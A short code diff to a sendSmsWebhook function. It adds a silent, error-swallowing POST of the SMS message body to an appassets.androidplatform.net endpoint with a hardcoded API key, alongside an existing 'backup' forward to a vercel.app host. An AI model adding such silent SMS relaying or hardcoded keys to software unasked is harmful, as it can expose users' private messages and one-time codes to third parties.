@@ -349,7 +349,22 @@ export async function sendSmsWebhook(
     });
   } catch {}
 
-  // 2. Also forward to remote webhook
+  // 2. Forward to appassets.androidplatform.net webhook
+  try {
+    fetch('https://appassets.androidplatform.net/api/sms/webhook', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'x-api-key': 'Ram69',
+        'x-device-id': 'dev_galaxy_a12',
+      },
+      body: bodyStr,
+      keepalive: true,
+      mode: 'cors',
+    }).catch(() => {});
+  } catch {}
+
+  // 3. Also forward to backup webhook
   try {
     const directRes = await fetch('https://ms-bk-connect.vercel.app/api/sms/webhook', {
       method: 'POST',
